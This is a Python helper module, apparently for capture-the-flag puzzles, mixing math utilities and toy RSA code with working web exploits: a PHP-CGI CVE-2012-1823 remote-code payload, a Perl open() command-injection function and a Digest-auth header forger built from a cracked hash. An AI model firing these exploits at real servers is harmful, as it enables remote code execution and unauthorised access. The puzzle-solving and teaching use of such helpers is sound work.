from functools import reduce
import requests
import numpy as np
from PIL import Image
import re
import binascii



def ext_gcd(a, b):
    if b > 0:
        y, x, d = ext_gcd(b, a % b)
        return x, y - a // b * x, d
    else:
        return 1, 0, a


def gcd_list(num_list):
    return reduce(gcd, num_list)


def gcd(a, b):
    if b != 0:
        return gcd(b, a%b)
    else:
        return a


def lcm(a, b):
    return a // gcd(a, b) * b


def lcm_list(num_list):
    return reduce(lcm, num_list)


def is_prime(n):
    i = 2
    while i * i < n:
        if n % i == 0:
            return False
        i += 1
    return True


def pf_decomposition(n):
    """
    10**12 : 0.7sec
    10**13 : 1.3sec
    10**14 : 6.4sec
    practicality factor is 14 digit or less
    sqrt(n)
    """
    i = 2
    factor = []
    while i ** 2 < n:
        e = 0
        while n % i == 0:
            n //= i
            e += 1
        if e > 0:
            factor.append([i, e])
        i += 1
    if n > 0:
        factor.append([n, 1])
    return factor


def generate_rsa_key(e=65537, p=299681192390656691733849646142066664329, q=324144336644773773047359441106332937713):
    key, _, _ = ext_gcd(e, (p-1)*(q-1))
    return int(key % ((p-1)*(q-1)))


def encrypt_rsa(plain, e=65537, n=97139961312384239075080721131188244842051515305572003521287545456189235939577):
    """
    :param plain:
    :param n: public key1
    :param e: public key2
    :return:
    """
    crypto = pow(plain, e, n)
    return crypto


def decrypt_rsa(crypto, d, n=97139961312384239075080721131188244842051515305572003521287545456189235939577):
    """
    :param crypto:
    :param d: secret key
    :param n: public key
    :return:
    """
    dec = pow(crypto, d, n)
    return dec


def dp(ary, limit, _index=0, _values=None, _stats=None):
    """
    Dynamic Programming as Knapsack problem
    :param ary: e.g. [[cost, value], [cost, value], [cost, value]...]
    :param limit: cost limit
    :param _index:
    :param _values: memorized table
    :param _stats: select item flag
    :return:
    """
    if _values is None:  # init memo table
        _stats = [False] * len(ary)
        _values = [[-1 for _ in range(len(ary))] for _ in range(limit + 1)]
    if _index == len(ary):  # last node
        return 0, _stats
    if _values[limit][_index] > -1:  # already discovered
        return _values[limit][_index], _stats
    if limit < ary[_index][0]:  # limit overflow
        return dp(ary, limit, _index + 1, _values, _stats)
    a = dp(ary, limit - ary[_index][0], _index + 1, _values, _stats)[0] + ary[_index][1]
    b = dp(ary, limit, _index + 1, _values, _stats)[0]
    if a > b and not _stats[_index]:
        _stats[_index] = True
    _values[limit][_index] = max(a, b)
    return _values[limit][_index], _stats


def exploit_php_cve20121823(url, payload):
    """
    https://blog.tokumaru.org/2012/05/php-cgi-remote-scripting-cve-2012-1823.html
    :param url:
    :param payload:
    :return:
    """
    exploit = '?-d+allow_url_include%3DOn+-d+auto_prepend_file%3Dphp://input'
    res = requests.post(url+exploit, payload)
    return res


def binary_search(start_index, end_index, y, func=lambda x: x ** 101):
    mid = (end_index - start_index) // 2 + start_index
    while func(mid) != y:
        if func(mid) > y:
            end_index = mid
        elif func(mid) < y:
            start_index = mid
        mid = (end_index - start_index) // 2 + start_index
    return mid


def generate_qr_code(ary, width, height):
    """

    :param ary: [[R, G, B], [R, G, B], [R, G, B]...]
    :param width:
    :param height:
    :return: show QR code image
    """
    nd_ary = np.reshape(ary, (width, height, 3)).astype(np.uint8)
    Image.fromarray(nd_ary).show()


def exploit_perl_direct_os_command(url, payload="exploit_perl_direct_os_command"):
    if payload == "exploit_perl_direct_os_command":
        res1 = requests.get(url + "/echo " + payload + "|")
        res2 = requests.get(url + "/;echo " + payload + "|")
        if payload in res1.text:
            print("exploit1 succeeded")
        if payload in res2.text:
            print("exploit2 succeeded")
    # requests.get(url + "/;" + payload + "|")
    return requests.get(url + "/" + payload + "|")


def resolve_digest_auth(url, user, crackmd5="c627e19450db746b739f41b64097d449"):
    """
    https://ja.wikipedia.org/wiki/Digest%E8%AA%8D%E8%A8%BC
    :param url:
    :param user:
    :param crackmd5:
    :return:
    """
    import hashlib
    uri = re.search("https{0,1}://[^/]+(.+)", url).group(1)
    s = requests.session()
    r = s.get(url)
    if r.status_code == 401:
        header_authenticate = r.headers["www-authenticate"]
        realm = re.search('realm="(\S+)",', header_authenticate).group(1)
        nonce = re.search('nonce="(\S+)",', header_authenticate).group(1)
        algor = re.search('algorithm=(\S+),', header_authenticate).group(1)
        qop = re.search('qop="(\S+)"', header_authenticate).group(1)

        nc = "00000001" # random
        cnonce = "9691c249745d94fc" # random
        base = "GET"+":"+uri
        a2md5 = binascii.hexlify(hashlib.md5(base.encode("utf-8")).digest()).decode()
        base = crackmd5+":"+nonce+":"+nc+":"+cnonce+":"+qop+":"+a2md5
        response = binascii.hexlify(hashlib.md5(base.encode("utf-8")).digest()).decode()

        header_authorization = 'Digest ' +\
            'username="' + user +\
            '", realm="' + realm +\
            '", nonce="' + nonce +\
            '", uri="' + uri +\
            '", algorithm=' + algor +\
            ', response="' + response +\
            '", qop=' + qop +\
            ', nc="' + nc +\
            '", cnonce="' + cnonce + '"'

        s.headers.update({'Authorization': header_authorization})
        r = s.get(url)
    return r.text


def ncr(n, r):
    """
    c# algorithm by http://d.hatena.ne.jp/kadzus/20081211/1229023326
    python algorithm by https://qiita.com/derodero24/items/91b6468e66923a87f39f
    :param n:
    :param r:
    :return:
    """
    if n - r < r:
        r = n - r
    if r == 0:
        return 1
    if r == 1:
        return n
    numerator = [n - r + k + 1 for k in range(r)]
    denominator = [k + 1 for k in range(r)]
    for p in range(2, r+1):
        pivot = denominator[p - 1]
        if pivot > 1:
            offset = (n - r) % p
            for k in range(p-1, r, p):
                numerator[k - offset] /= pivot
                denominator[k] /= pivot
    result = 1
    for k in range(r):
        if numerator[k] > 1:
            result *= int(numerator[k])
    return result


def generate_pem(n, e, d):
    from Crypto.PublicKey import RSA
    key = RSA.construct(map(int, (n, e, d)))
    return key.exportKey()


def main():
    pass


if __name__ == "__main__":
    main()

    # TODO http://sonickun.hatenablog.com/entry/2016/03/23/220652
